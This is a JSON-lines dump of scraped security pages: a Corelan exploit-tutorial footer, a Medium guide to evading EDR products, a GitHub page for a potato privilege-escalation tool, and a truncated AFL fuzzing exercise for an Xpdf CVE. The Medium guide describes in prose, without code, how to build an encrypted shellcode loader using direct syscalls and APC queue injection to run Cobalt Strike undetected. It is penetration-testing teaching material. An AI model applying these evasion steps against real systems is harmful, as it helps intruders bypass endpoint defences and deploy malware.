?\n[60]https:\/\/www.corelan.be\/index.php\/forum\/writing-exploits\n\u00a9 2009 \u2013 2015, [61]Peter Van Eeckhoutte (corelanc0d3r). All rights\nreserved.\nSimilar\/Related posts:\n[62]Default Thumbnail Exploit writing tutorial part 1 : Stack Based\nOverflows [63]Default Thumbnail Exploit writing tutorial part 3 : SEH\nBased Exploits [64]Default Thumbnail Exploit writing tutorial part 6 :\nBypassing Stack Cookies, SafeSeh, SEHOP, HW DEP and ASLR [65]Default\nThumbnail Exploit writing tutorial part 3b : SEH Based Exploits \u2013 just\nanother example [66]Default Thumbnail Exploit writing tutorial part 5 :\nHow debugger modules & plugins can speed up basic exploit development\nPosted in [67]001_Security, [68]Exploit Writing Tutorials, [69]Exploits\n| Tagged [70]41414141, [71]add esp, [72]blind return, [73]buffer,\n[74]buffer overflow, [75]bytes, [76]dll, [77]eip, [78]findjmp, [79]jmp,\n[80]jmp esp, [81]jumpcode, [82]metasploit, [83]nop, [84]opcode,\n[85]pop, [86]pop pop ret, [87]push ret, [88]pwned, [89]reg + offset,\n[90]ret, [91]shellcode, [92]stack\n15 Responses to Exploit writing tutorial part 2 : Stack Based Overflows \u2013\njumping to shellcode\n* Pingback: [93]Recognize-Security | Peter Van Eeckhoutte\u2019s Exploit\nWriting Tutorials\n____________________ Search\nCorelan Training\nWe have been teaching our win32 exploit dev classes at various security\ncons and private companies & organizations since 2011\nCheck out our schedules page [94]here and sign up for one of our\nclasses now!\nDonate\nWant to support the Corelan Team community ? [95]Click here to go to\nour donations page.\nWant to donate BTC to Corelan Team?\n[donate_btc_to_corelan_thumb.png]\nYour donation will help funding server hosting.\n[INS: :INS]\nCorelan Team Merchandise\nYou can support Corelan Team by donating or purchasing items from\n[96]the official Corelan Team merchandising store.\n[97]Protected by Copyscape Web Plagiarism Tool\nCorelan on Slack\nYou can chat with us and our friends on our Slack workspace:\nGo to [98]our facebook page\nBrowse through the posts and find the invite to Slack\nUse the invite to access our Slack workspace\nActions\n* [99]Log in\n* [100]Entries feed\n* [101]Comments feed\n* [102]WordPress.org\nCategories\nCategories[Select Category_____________]\nMastodon: [103]@corelanc0d3r | [104]@corelan\nCopyright Peter Van Eeckhoutte \u00a9 2007 - 2024 | All Rights Reserved |\n[105]Terms of use\n7ads6x98y\nHi there!\nDo you like our free content? Enjoying the materials we put together?\nAre you interested in learning how to write exploits for Windows, but\nperhaps looking for updated materials?\nAre you struggling to fully grasp the concepts based on what you find\nonline? Would you perhaps prefer to learn in a classroom setting\ninstead?\nWe have good news for you!\nDid you know that we travel to strategic places around the world, to\nteach our world-renowned exploit development classes.\nIn order to preserve and ensure a top-quality learning experience, all\nof our classes are delivered in-person.\nI also teach private classes! For larger groups, I\u2019ll glady come to\nyou. For smaller groups, willing to travel to Belgium,  I\u2019ll provide a\ntraining room near Bruges.\nWe currently offer 2 classes:\nOur \u201c[106]Bootcamp\u201d classes covers the basics of exploit development\nfor Windows 11.\nThe \u201c[107]Advanced\u201d class covers heap exploitation for Windows 7,\nWindows 10 and Windows 11.\nBoth classes contain a short introduction on x64 exploitation!\nYou can find our schedules here:\n[108]https:\/\/www.corelan-training.com\/index.php\/training-schedules .\n>>> Our classes tend to sell out fast, so sign up today and secure\nyour seat in one of our classes !! <<<\nAnd if you\u2019re not sure \u2013 [109]feel free to check what our students have\nto say about our classes.\nEnjoy!\n(BUTTON) X\nWe are using cookies to give you the best experience on our website.\nYou can find out more about which cookies we are using or switch them\noff in (BUTTON) settings.\n(BUTTON) Accept\n(BUTTON) Change cookie settings\n(BUTTON) Close GDPR Cookie Settings\n* (BUTTON) Privacy Overview\n* (BUTTON) Strictly Necessary Cookies\n* (BUTTON) Cookie Policy\nPrivacy Overview\na. Corelan respects your privacy. Most information accessible on or via\nthe\nCorelan Website is available without the need to provide personal\ninformation.\nIn certain cases you may however be requested to submit personal\ninformation. In\nsuch case your personal information shall be treated in accordance with\nthe General Data Protection Regulation and any amendments hereof.\nb. All personal information made available by you will be treated\nsolely for\nthe purpose of making available to you the requested information or\nservices.\nYour personal information will not be shared with third parties, but it\nmay be used for authentication, support & marketing purposes in\nrelation with services provided by Corelan.\nc. We will only keep your personal information for as long as is\nrequired to\nprovide you with the requested information or services, or for any\nlonger period\nas may legally be required.\nd. It is our goal to reasonably protect the personal information made\navailable by you from third parties.\ne. You have the right to consult, correct, adjust or have removed your\npersonal details by written request to Corelan.  If you decide to get\nyour information removed, you understand and accept that you will lose\nall access to any resources that require the use of these personal\ndetails, such as parts of the website that require authentication.\nf. When using the Corelan Website, cookies may possible be used. You do\nnot have to accept cookies to be able to use the publicly accessible\nparts of Corelan Websites. If you have an account and you log in to\nthis site, we will set a temporary cookie to determine if your browser\naccepts cookies. This cookie contains no personal data and is discarded\nwhen you close your browser.\nWhen you log in, we will also set up several cookies to save your login\ninformation and your screen display choices.   Cookies may be used to\ndisplay advertisements or to collect statistics about the use of the\nCorelan website.\ng. This privacy policy may be amended by Corelan at any time.\nStrictly Necessary Cookies\nStrictly Necessary Cookie should be enabled at all times so that we can\nsave your preferences for cookie settings.\nEnable or Disable Cookies [ ]\nIf you disable this cookie, we will not be able to save your\npreferences. This means that every time you visit this website you will\nneed to enable or disable cookies again.\nCookie Policy\nWhen using the Corelan Website, cookies may possibly be used. You do\nnot have to accept cookies to be able to use the publicly accessible\nparts of the Corelan Website. If you have an account and you log in to\nthis site, we will set a temporary cookie to determine if your browser\naccepts cookies. This cookie contains no personal data and is discarded\nwhen you close your browser. When you log in, we will also set up\nseveral cookies to save your login information and your screen display\nchoices.\nWe may use third party cookies to show ads and to collect anonymous\ninformation such as the number of visitors to the site, and the most\npopular pages.  The ability to show ads is an important source of\nincome to cover the hosting fees to keep this website alive. If you\nprevent ads from being displayed, this website will eventually\ndisappear.\nThird party vendors, including Google, use cookies to serve ads based\non a user's prior visits to this website or other websites.\nGoogle's use of advertising cookies enables it and its partners to\nserve ads to your users based on their visit to this site and\/or other\nsites on the Internet.\n(BUTTON) Enable All (BUTTON) Save Changes"}
{"text":"#[1]Medium [2]alternate\n[3]Open in app\n(BUTTON) Sign up\n[4]Sign in\n____________________\nWrite\n(BUTTON) Sign up\n[5]Sign in\n(BUTTON)\nA Beginner\u2019s Guide to EDR Evasion\nOr, how to get past Crowdstrike\/Defender ATP\/Carbon Black on your next\nengagement\nKyle Mistele\n[6]Kyle Mistele\n\u00b7\n[7]Follow\n16 min read\n\u00b7\nSep 25, 2021\n--\n(BUTTON)\n(BUTTON)\nListen\n(BUTTON)\nShare\nIn this post, I\u2019m going to cover the process I used to write a\nshellcode loader to evade industry-leading EDR solutions and\nsuccessfully run Cobalt Strike undetected on various endpoints during\nan engagement. This is basically a more in-depth version of a\npresentation I gave at Dallas Hackers Assocation.\nNone of the techniques discussed here are new per se. Rather, I took\nsome existing tools and methodologies and combined them to achieve the\neffect that I wanted.\nWhat this post is\nIn this post, I\u2019m going to cover a variety of topics, including:\n* The mechanics of API Hooking\n* Why API unhooking is important, but in this case not necessary\n* Talk about my process and methodology going into this project\n* Go over some of my favorite techniques for evading hooking and\nperforming process injection\nWhat this post is not\nThis post is not a tool drop \u2014 I am not open-sourcing any of the\ntooling or code I wrote. This post is entirely theoretical, however, a\nsufficiently technically skilled reader should be able to recreate\nsomething similar to my toolset from the techniques described here. If\nyou\u2019re reasonably skilled with Windows C++, reading documentation, and\ndoing some creative googling, you should have no problem.\nWindows API Hooking\nWindows API hooking is one of the varieties of mechanics that most EDRs\nuse to detect malicious behavior, and in particular, process injection.\nIn order to bypass this type of detection, it\u2019s very important to\nunderstand what API hooking is, how it works, and how to undo\n(\u201cunhook\u201d) it.\nImportant Concepts\nFor the purposes of the rest of this post, it will help to think of a\nfunction as a pointer to a routine in memory. This routine is defined\nby a series of assembly instructions, which will vary depending on the\nprocessor architecture. These assembly instructions are several-byte\nopcodes.\nThe Windows API is the interface through which we can programmatically\naccess and manipulate system resources such as processes, threads,\nmemory, and so forth. It is provided by a series of header files ( .h\nfiles in C++) that export various types and functions. The interface\nlooks a little different in C#, but the underlying concepts are\nfunctionally the same.\nThe most common header to import is Windows.h, but depending on the\nresources that we\u2019re accessing and manipulating, we may import a\nvariety of other headers such as processthreadsapi.h, or memoryapi.h .\nMore information on headers like these can be found in the [8]Windows\ndocumentation.\nAPI Hooking refers to a technique used by EDRs and other programs such\nas anti-cheat engines to redirect the flow of program execution when a\ncertain function is called. When a hooked function is called, execution\nis redirected by the \u201chook\u201d to some routine in a library that has been\nloaded into the process, before eventually returning to the normal flow\nof execution or terminating the call. Methods for this vary \u2014 some will\nbe discussed further on in this post.\nHow the Windows API Works\nWhen a user makes a call to one of the functions exported by the system\nheader files that make up the Windows API, execution jumps into the\nWindows library that the header is defining exports from. This library\ndoes some sanity checks, validation, and type conversions, and then\nwill call an unexported function in NTDLL.dll, kernel32.dll, or another\nsystem linked library. This function will then set up the appropriate\nregisters with the correct syscall number before executing the syscall\ninstruction that jumps from user-mode into kernel-mode.\nIt\u2019s worth noting that the register values (parameters) that are set up\nand the syscall number actually vary from windows version to windows\nversion, and even among various service packs and patch levels across\nthe same windows version.\nHere\u2019s an example of the normal execution flow for the Windows API call\nCreateRemoteThread .\nCalling CreateRemoteThread via the Windows API.\nFirst, the user imports the processthreadsapi.h header and calls\nCreateRemoteThread with the correct parameters. This function will do\nthe sanity checks and so forth, and then it will call the unexported\nNtCreateThreadEx function in NTDLL.dll. This function will then set up\nthe appropriate registers with parameters and the syscall number before\nexecuting the syscall instruction to jump into kernel-mode. Once the\nkernel-mode syscall is done executing, execution will return to\nuserland and eventually back to the caller.\nHow API Hooking Works\nAPI Hooking can also be done either in the header function (e.g.\nCreateRemoteThread), or in the unexported NTDLL function (e.g.\nNtCreateThreadEx). Hooking is now more commonly done in the latter of\nthe two because hooking in the former is easier to bypass.\nWhen an EDR hooks various API functions, the EDR will load a library\ninto all newly created processes. Then, it will proceed to \u201chook\u201d\nWindows API functions that are commonly used by malware \u2014 most\ncommonly, functions that have to do with process and thread creation\nand manipulation, memory mapping, etc. Common examples include\nNtCreateThreadEx, NtMapViewOfSection, NtAllocateVirtualMemory, and so\nforth. There are a variety of techniques for creating the actual hook\n(and most of them are similar), but the most common one involves\nreplacing the first instruction of the unexported function in the\nsystem DLL with a jmp instruction that jumps to a routine in the EDR\u2019s\nloaded library.\nIt\u2019s worth noting that hooking is done at runtime \u2014 hooks are rarely\nadded to NTDLL on disk; rather the EDR will hook NTDLL in memory once\nthe process has loaded it.\nEDRs use this technique to track which API calls are being called, in\nwhat sequence they are being called, and with what arguments they are\nbeing called. Certain sequences of API calls are known to be commonly\nabused, e.g. NtOpenProcess ( OpenProcess), NtAllocateVirtualMemory (\nVirtualAllocEx), NtWriteVirtualMemory ( WriteProcessMemory), and then\nNtCreateThreadEx ( CreateRemoteThread). This technique is used commonly\nby malware, including by Cobalt Strike, to perform process injection.\nHowever, there are many other such sequences of API calls that are\ncommonly malicious. By hooking functions to detect these sequences of\ncalls, EDRs can detect the malicious behavior, and terminate the\noffending processes.\nHere\u2019s an example of what a hooked API call\u2019s execution flow might look\nlike:\nNote that this assumes that the hook is being placed in the unexported\nNTDLL function, not in the exported API function.\nWhen a process calls a function like CreateRemoteThread, execution will\neventually jump into the corresponding unexported NTDLL function (here,\nNtCreateThreadEx). The first instruction of this function, since it is\nhooked, will be a jmp instruction that jumps into the EDR\u2019s loaded\nlibrary. The EDR may examine the parameters and will check to see what\nother syscalls have been made before it. Then the EDR will either\nreturn execution to the unexported function before execution hits the\nsyscall instruction and jumps into kernel mode, or the EDR will detect\na sequence of system calls that it identifies as malicious and\nterminate the process.\nEDR Evasion through API Unhooking\nWhy do API Unhooking?\nSo why should we do API Unhooking? Well, first of all, it allows us to\navoid having our API call sequences detected by the EDR. If we can\nremove the hooks, we can (theoretically) avoid detection.\nThe EDR\u2019s hooks are necessarily in our process\u2019s memory space, and\nsince we own the process, we can read\/write to it, and we can therefore\noverwrite the hooks \u2014 we just have to replace the jmp instructions with\nthe proper instructions.\nLimits to API Unhooking\nOf course, there are practical limits to this \u2014 certain process\ninjection techniques can be and will be caught through means other than\nAPI hooking. For example, the CreateRemoteThread technique can be\ncaught through other forms of telemetry, including monitoring process\nhandles and threads, and the Windows event log. Some techniques are\nmuch more difficult to detect, but determining which those are is left\nas an exercise to the reader :)\nPopular Ways to Unhook Hooked Windows API Calls\nThere are a variety of ways to deal with API hooking, and everyone has\ntheir favorite. Common ones include but are not limited to the\nfollowing:\nOverwriting in-memory hooks with your own copy of the routines at\nruntime\nIn this technique, you pack your own copy of the first few bytes of the\nunexported NTDLL functions in your executable and overwrite the hooks\nwith these at runtime. You will of course have to reprotect the\ninstructions before overwriting them since they\u2019ll be in read-execute\nmemory and you\u2019ll need write permissions. One downside of this is that\nyou have to know your OS and version\/service pack since the routines\ncan change depending on these factors.\nMapping NTDLL from disk entirely over NTDLL in memory\nAnother popular technique is to read NTDLL off of the disk and then map\nit over the copy of NTDLL that's been loaded in memory. One of the\ndownsides of this is that it can be technically complicated since you\nhave to rebase addresses. This technique is also pretty easy to detect.\nRetrieving NTDLL function stubs from disk at runtime and unhook\nThe last technique that I\u2019m going to discuss here is somewhere in\nbetween the two \u2014 you\u2019re only overwriting the hooks for the calls you\nneed, but you are reading the function stubs off of the NTDLL on disk\nso you don\u2019t have to worry about portability as much.\nUpsides of API Unhooking\nClearly, there are a variety of techniques that you can choose that\nwill allow you to be as surgical (or as imprecise) as you want. And\nultimately, all of these techniques will allow you to flush out the\nEDR\u2019s hooks. However, these techniques come with a few caveats.\nDownsides of API Unhooking\nUnfortunately, the problem with doing API unhooking is that you still\nultimately have to use hooked API calls to do the unhooking. As a\nresult, your unhooking can actually be detected by the EDR and flagged\nas malicious. Of course, not all EDRs will necessarily detect this, but\nit\u2019s still a risk.\nEDR Evasion by Packing Your Own WinAPI Calls\nOf course, API unhooking isn\u2019t the only way to evade EDRs. In this\nsection, I\u2019m going to cover my personal favorite technique for evasion.\nSo what if, instead of trying to use hooked functions to unhook\nfunctions, we just supplied our own copies of the functions that the\nEDR doesn\u2019t know to hook? This is exactly what I\u2019m proposing. By\npacking our own copies of the unexported functions in NTDLL that we\nwant to use, we can completely avoid the EDR\u2019s hooks by jumping\nstraight from our program\u2019s code into kernel mode, without having to go\nthrough the Windows API and hooked code. It\u2019s very stealthy.\n\u201cSo I can just copy the routines from NTDLL I need and pack them into\nmy executable before compiling it and dropping it on the target\u201d?\nUnfortunately, the answer is no, because Windows is awful and makes\nlife hard :(\nThe long and short of it is that, as I mentioned earlier, the functions\nin NTDLL are setting up registers with things like syscall numbers and\narguments before actually executing the syscall instruction.\nUnfortunately, the argument setup and syscall number change not only\nbetween Windows OS versions (XP, 7, 8, 10) but also frequently between\nservice pack levels and patch levels. Therefore, copies of functions\nfrom NTDLL aren\u2019t guaranteed to be portable from one system to another.\nSo what\u2019s the solution?\nUltimately, what we need is assembly code to determine the OS version,\nservice pack (if applicable), patch level, and other relevant\nattributes. Then, that code would need to provide versions of the NTDLL\nroutines we want for all OSes\/versions that we want to support in our\nloader, and would have to make the determination of which one to jump\nto. Suddenly, we\u2019re dealing with a very complicated assembly routine\ninstead of just a routine copied from NTDLL.\nI hate x64 assembly, and can\u2019t write it anyways \u2014 I learned ARM. As a\nresult, writing that code myself was pretty much out of the question.\nSysWhispers \u2014 Packing your own direct system calls\nFortunately, someone who is much smarter than I am and much better at\nx64 assembly than I am wrote a neat tool called [9]SysWhispers.\nSyswhispers automates a lot of the process for you and generally makes\nlife easier for you. [10]Syswhispers 2 has since been released and\nmakes life even easier. Syswhispers originally only supported x64\narchitectures, but there is also an [11]unsupported fork that claims to\nsupport x86, though I haven\u2019t tested it and the readme is in a language\nI don\u2019t speak :P\nThe idea of the tool is to run the tool on a clean Windows installation\n(i.e. one without AV\/EDR installed), and pick the Windows API calls\nthat you want. SysWhispers will generate a .asm file and a .h file that\nyou can include in your project (I recommend using Visual Studio, but\nof course you can use whatever you want). If you\u2019re using Visual\nStudio, make sure to enable the Microsoft Macro Assembler in the\nproject settings, and set the build type for the .asm file to \u201cMacro\nAssembler\u201d \u2014 neither of these things are done by default.\nThen, you can use the functions exported in the header file to perform\nthe operations. The interfaces will be identical to the corresponding\nunexported NTDLL functions, not to the higher-level Windows API call\nprovided by the system headers.\nUnfortunately, since the unexported NTDLL functions are also\nundocumented, it can take some doing to figure out how to set the\narguments up properly, especially since some of them take widechar\nstrings instead of standard ASCII c-strings. One resource that helped\nme a lot with this was the following unofficial documentation that\nsomeone put together: [12]http:\/\/undocumented.ntinternals.net.\nPerforming Process Injection without Getting Detected\nThere are a variety of techniques for doing process injection \u2014 in this\nsection, I\u2019m only going to cover the technique that you should not use,\nand then my favorite technique.\nHow NOT to do process injection\nDo not, ever, under any circumstances, think you are going to get away\nwith CreateRemoteThread-based process injection. Unless you uninstall\nthe AV\/EDR from your target, it\u2019s not gonna happen. EDR\u2019s don\u2019t need\nAPI hooking to detect this technique, so all the unhooking and direct\nsystem calls in the world won\u2019t help you if you\u2019re up against\nCrowdstrike and decide it\u2019s a good idea to try this.\nThis is detectable by monitoring processes and threads, by event logs,\nand a dozen other things. Seriously, don\u2019t do it.\nFun fact: for those of you out there using Cobalt Strike, CS does this\nby default for process migration, and Meterpreter might as well.\nWindows Defender ATP for example actually identifies this technique as\nCobalt Strike, even if you\u2019re not using a CS shellcode. Just don\u2019t do\nit.\nMy favorite technique: APC Queue Injection\nOne of my favorite techniques for process injection is APC Queue\ninjection. This has become an increasingly popular technique lately, at\nleast in part because it\u2019s darn near impossible to detect without API\nhooking \u2014 APCs and APC Queues are almost impossible to monitor, since\nWindows provides a way for you to queue up APCs, but not to query APC\nqueues or gain any type of visibility whatsoever into them.\nAPC Queue injection is great for executing shellcode in local processes\n100% reliably, and can also be used for remote process injection,\nalbeit with slightly less reliability \u2014 fortunately, there are ways to\nimprove on it which I\u2019ll cover.\nSo what on earth is an APC?\nAs most programmers know, threads execute code concurrently (and often\nin parallel) within the same process. An Asynchronous Procedure Call\n(APC) executes code asynchronously in the context of a thread. APCs are\npeculiar to Windows, so you won\u2019t find them on Linux.\nEssentially, each thread has an APC Queue, or a queue of APCs to\nexecute. Adding an APC to a queue is about as simple as creating a\nthread, in that you just have to specify a routine for the APC to\nexecute. To use an APC to execute our shellcode, we just specify a\npointer to our shellcode in memory and queue that as an APC.\nThe reason you most likely have not heard of APCs is because they are\nmost commonly used by the kernel. However, APCs can be queued from both\nuser-mode and kernel-mode. The Windows API function to queue an APC is\nQueueUserAPC, and the undocumented NTDLL function that it calls is\nNtQueueApcThread.\nThe Problem with APCs\nSounds pretty great so far, right? Unfortunately, there\u2019s a somewhat\nsignificant caveat \u2014 a user-mode APC will only be picked up and\nexecuted by the thread it\u2019s queued on if the thread is in an alertable\nstate.\nThreads only enter alertable states when certain I\/O-related functions\nare called, e.g. for IPC (inter-process communication) and so forth. As\na result, finding alertable threads isn\u2019t super easy. To make things\nworse, there\u2019s no way to check which threads are in alertable states\nand which aren\u2019t. You can find more on this, including a list of\nfunctions that will put threads in an alertable state, [13]here.\nA Solution for executing APCs\nFortunately, there are two possible solutions to this problem.\nOption #1: we can elect to not perform process injection, and to inject\ninto the APC queue of a thread in the launcher process. Then, we can\nforce-flush the APC queue with an unexported NTDLL function. This\nentails a standalone launcher, that doesn\u2019t do process injection, but\nwith some userland PEB spoofing (e.g. PPID spoofing + command line\nspoofing) this can still be a viable option \u2014 I\u2019ve had it work on\nengagements before.\nOption #2: We spray APCs across most\/all of a process\u2019s threads and\nhope for the best. The reliability of this depends on how many threads\nyour target process has, and how much I\/O the process is doing. I\u2019ve\nfound that I\u2019ve achieved 100% success when targeting the main process\nof web browsers (chrome, firefox, etc.) \u2014 for example, Firefox\u2019s main\nprocess that controls the child processes for additional tabs often has\n50+ threads and does a lot of I\/O. Often I\u2019ll get 8+ beacons back.\nHowever, there\u2019s a caveat to this \u2014 inject into too few threads, and\nyou won\u2019t get a beacon back. Inject into too many, and you risk making\nthe process unresponsive or buggy for the user.\nYou can further increase your chances of success for option #2 by\nwriting a tool to enumerate writable processes and their thread counts,\nand then pick one that looks viable. I wrote a program to do this, and\neven though I didn\u2019t try and use unhooked API calls or direct syscalls,\nit wasn\u2019t detected since it\u2019s not technically doing anything \u201cevil\u201d.\nIt\u2019s a super easy program to write, so I won\u2019t go into depth on this\nhere.\nAPC Queue Injection Mechanics\nI put together a diagram that describes how to perform remote process\ninjection via APC Queue injection \u2014 it\u2019s important to note though that\nit does gloss over a few important things like opening processes and\nclosing handles for the sake of brevity, but you should be able to\ninfer these \u2014 once you\u2019re done with a handle, close it. Simple.\nAPC Queue Process Injection\nSo first, you\u2019re going to open up your target process (omitted in the\ndiagram above). Then, you\u2019re going to allocate memory inside of it in\nread-write mode only \u2014 avoid read-write-execute memory at all costs, as\nit\u2019s a red flag to EDRs and AV engines alike. Write your shellcode to\nit, then re-protect the memory as read-execute. This will of course\nbreak any self-decoding or self-decrypting shellcode, which I never\nrecommend using \u2014 encrypt and encode your shellcode yourself, then\ndecrypt it in memory before trying to execute it.\nOnce you\u2019ve re-protected your shellcode in the remote process, you\u2019re\ngoing to use a weird API function called Createtoolhelp32Snapshot, and\nthen call thread32first to get a handle on the process\u2019s first thread.\nUnfortunately, this process is necessary since thread IDs aren\u2019t\nnecessarily sequential. Once you open the thread, you\u2019ll queue an APC\nto it, and then close it and move on to the next thread.\nAlternatively, you can do your APC Queue injection in the local\nprocess, and therefore guarantee shellcode execution:\nDoing APC Queue Injection in a local process\nPutting it all together: building our shellcode loader\nTo build our EDR-evading shellcode loader, we have a few requirements:\n1. Bypasses EDR hooking via direct system calls (as described above)\n2. Decrypts encrypted shellcode in memory to avoid signature-based\ndetections\n3. Is capable of performing process injection without getting caught\nthrough other forms of telemetry.\nHere\u2019s the process you should follow:\n1. Generate your Cobalt Strike\/other shellcode in a raw binary format\n2. Encrypt the shellcode \u2014 you can use AES or just simple iterative\nXOR encryption with a key, just don\u2019t use a one-byte key. All the\nin-memory evasion in the world won\u2019t help you if you\u2019re dropping\nunencrypted Cobalt Strike shellcode on-disk for AV\/EDR to spot.\n3. Generate the .h and .asm files that contain your the direct\nsyscalls you want to use with SysWhispers.\n4. Use these functions to perform APC Queue Injection in the local\nprocess or in a remote one.\n5. Profit.\n(More) Caveats\nA few parting notes and caveats:\n* These techniques (for local process and remote process APC Queue\nInjection) worked when I tested them in July & August of 2021\nagainst Defender ATP and Crowdstrike\u2014 but this is no guarantee that\nthey can\u2019t or won\u2019t be detected in the future, as always this is a\npoint-in-time assessment.\n* This technique will not by itself get you past application\nwhitelisting or application reputation scoring (the \u201cprotect your\ncomputer from potentially unwanted applications\u201d option), which\nDefender ATP can do \u2014 although it\u2019s not enabled by default. If you\ndo run into reputation scoring, you may be able to bypass it via\nGUI (defender may present you with a dialog asking you if you want\nto run it anyways). If you run into application whitelisting, good\nluck.\nConclusion\nIn this post, I\u2019ve covered the techniques and processes that I used to\ndevelop a shellcode loader to bypass Crowdstrike and Windows Defender\nATP and run Cobalt Strike on multiple engagements. While I didn\u2019t share\nany code due to the sensitive nature of the topic, a sufficiently\ntechnical reader should be able to recreate something like what I have\ndescribed from the details I have given. Thoughts, questions, feedback?\nFeel free to ping me on my [14]Twitter!\nPenetration Testing\nRed Team\nMalware\nHacking\nCybersecurity\n--\n--\n(BUTTON)\n(BUTTON)\nKyle Mistele\n(BUTTON) Follow\n[15](BUTTON)\n[16]\nWritten by Kyle Mistele\n[17]197 Followers\nStudent, hacker, OSCP. My other computer is your computer.\n(BUTTON) Follow\n[18](BUTTON)\n[19]\nHelp\n[20]\nStatus\n[21]\nAbout\n[22]\nCareers\n[23]\nBlog\n[24]\nPrivacy\n[25]\nTerms\n[26]\nText to speech\n[27]\nTeams"}
{"text":"#[1]GitHub\n[2]Skip to content\n(BUTTON) Toggle navigation\n[3]Sign in\n(BUTTON)\n* (BUTTON) Product\n+ Actions\nAutomate any workflow\n+ Packages\nHost and manage packages\n+ Security\nFind and fix vulnerabilities\n+ Codespaces\nInstant dev environments\n+ Copilot\nWrite better code with AI\n+ Code review\nManage code changes\n+ Issues\nPlan and track work\n+ Discussions\nCollaborate outside of code\nExplore\n+ [4]All features\n+ [5]Documentation\n+ [6]GitHub Skills\n+ [7]Blog\n* (BUTTON) Solutions\nFor\n+ [8]Enterprise\n+ [9]Teams\n+ [10]Startups\n+ [11]Education\nBy Solution\n+ [12]CI\/CD & Automation\n+ [13]DevOps\n+ [14]DevSecOps\nResources\n+ [15]Learning Pathways\n+ [16]White papers, Ebooks, Webinars\n+ [17]Customer Stories\n+ [18]Partners\n* (BUTTON) Open Source\n+ GitHub Sponsors\nFund open source developers\n+ The ReadME Project\nGitHub community articles\nRepositories\n+ [19]Topics\n+ [20]Trending\n+ [21]Collections\n* [22]Pricing\n(BUTTON)\nSearch or jump to...\nSearch code, repositories, users, issues, pull requests...\nSearch\n____________________\nClear (BUTTON)\n[23]Search syntax tips\nProvide feedback\n(BUTTON)\nWe read every piece of feedback, and take your input very seriously.\n____________________________________________________________\n____________________________________________________________\n____________________________________________________________\n____________________________________________________________\n[ ] Include my email address so I can be contacted\n(BUTTON) Cancel (BUTTON) Submit feedback\nSaved searches\nUse saved searches to filter your results more quickly\n(BUTTON)\nName ____________________\nQuery ____________________\nTo see all available qualifiers, see our [24]documentation.\n(BUTTON) Cancel (BUTTON) Create saved search\n[25]Sign in\n[26]Sign up\nYou signed in with another tab or window. [27]Reload to refresh your\nsession. You signed out in another tab or window. [28]Reload to refresh\nyour session. You switched accounts on another tab or window.\n[29]Reload to refresh your session. (BUTTON) Dismiss alert\n(BUTTON)\n{{ message }}\n[30]TsukiCTF \/ [31]Lovely-Potato Public\n* [32]Notifications\n* [33]Fork 29\n* [34]Star 133 (BUTTON)\n*\nAutomating juicy potato local privilege escalation exploit for\npenetration testers\n[35]133 stars [36]29 forks [37]Branches [38]Tags [39]Activity\n[40]Star (BUTTON)\n[41]Notifications\n* [42]Code\n* [43]Issues 0\n* [44]Pull requests 0\n* [45]Actions\n* [46]Projects 0\n* [47]Security\n* [48]Insights\n(BUTTON) Additional navigation options\n* [49]Code\n* [50]Issues\n* [51]Pull requests\n* [52]Actions\n* [53]Projects\n* [54]Security\n* [55]Insights\nTsukiCTF\/Lovely-Potato\nThis commit does not belong to any branch on this repository, and may\nbelong to a fork outside of the repository.\nAbout\nAutomating juicy potato local privilege escalation exploit for\npenetration testers\nResources\n[56]Readme\n[57]Activity\nStars\n[58]133 stars\nWatchers\n[59]2 watching\nForks\n[60]29 forks\n[61]Report repository\n[62]Releases\nNo releases published\n[63]Packages 0\nNo packages published\nLanguages\n* [64]PowerShell 87.3%\n* [65]Batchfile 12.7%\nFooter\n\u00a9 2024 GitHub, Inc.\nFooter navigation\n* [66]Terms\n* [67]Privacy\n* [68]Security\n* [69]Status\n* [70]Docs\n* [71]Contact\n* (BUTTON) Manage cookies\n* (BUTTON) Do not share my personal information\n(BUTTON) You can\u2019t perform that action at this time.\n(BUTTON)"}
{"text":"# Exercise 1 - Xpdf\n\nFor this exercize we will fuzz **Xpdf** PDF viewer. The goal is to find a crash\/PoC for [**CVE-2019-13288**](https:\/\/www.cvedetails.com\/cve\/CVE-2019-13288\/) in XPDF 3.02. \n\n<details>\n  <summary>For more information about CVE-2019-13288 vulnerability, click me!<\/summary>\n  --------------------------------------------------------------------------------------------------------\n  \n  **CVE-2019-13288** is a vulnerability that may cause an infinite recursion via a crafted file.\n  \n  Since each called function in a program allocates a stack frame on the stack, if a a function is recursively called so many times it can lead to stack memory exhaustion and program crash.\n  \n As a result, a remote attacker can leverage this for a DoS attack.\n \n You can find more information about Uncontrolled Recursion vulnerabilities at the following link: https:\/\/cwe.mitre.org\/data\/definitions\/674.html\n  \n<\/details>\n\n## What you will learn\nAfter completing this exercise, you will know the basis of fuzzing with AFL, such as:   \n- Compiling a target application with instrumentation \n- Running a fuzzer (afl-fuzz)\n- Triaging crashes with a debugger (GDB)\n\n## Read Before Start\n- I suggest you to try to **solve the exercise by yourself** without checking the solution. Try as hard as you can, and only if you get stuck, check out the example solution below.\n- AFL uses a non-deterministic testing algorithm, so two fuzzing sessions are never the same. That's why I highly recommend **to set a fixed seed (-s 123)**. This way your fuzzing results will be similar to those shown here and that will allow you to follow the exercises more easily.  \n- If you find a new vulnerability, **please submit a security report** to the project. If you need help or have any doubt about the process, the [GitHub Security Lab](mailto:securitylab.github.com) can help you with it :)\n\n## Contact\nAre you stuck and looking for help? Do you have suggestions for making this course better or just positive feedback so that we create more fuzzing content?\nDo you want to share your fuzzing experience with the community?\nJoin the GitHub Security Lab Slack and head to the `#fuzzing` channel. [Request an invite to the GitHub Security Lab Slack](mailto:securitylab-social@github.com?subject=Request%20an%20invite%20to%20the%20GitHub%20Security%20Lab%20Slack)\n\n## Environment\n\nAll the exercises have been tested on **Ubuntu 20.04.2 LTS**. I highly recommend you to use **the same OS version** to avoid different fuzzing results and to run AFL++ **on bare-metal** hardware, and not virtualized machines, for best performance.\n\nOtherwise, you can find an Ubuntu 20.04.2 LTS VMware image [here](https:\/\/drive.google.com\/file\/d\/1_m1x-SHcm7Muov2mlmbbt8nkrMYp0Q3K\/view?usp=sharing). You can also use VirtualBox instead of VMware.\n\nThe username \/ password for this VM are `fuzz` \/ `fuzz`.\n\n## Download and build your target\n\nLet's first get our fuzzing target. Create a new directory for the project you want to fuzz:\n```\ncd $HOME\nmkdir fuzzing_xpdf && cd fuzzing_xpdf\/\n```\nTo get your environment fully ready, you may need to install some additional tools (namely make and gcc) \n```\nsudo apt install build-essential\n```\n\nDownload Xpdf 3.02:\n```\nwget 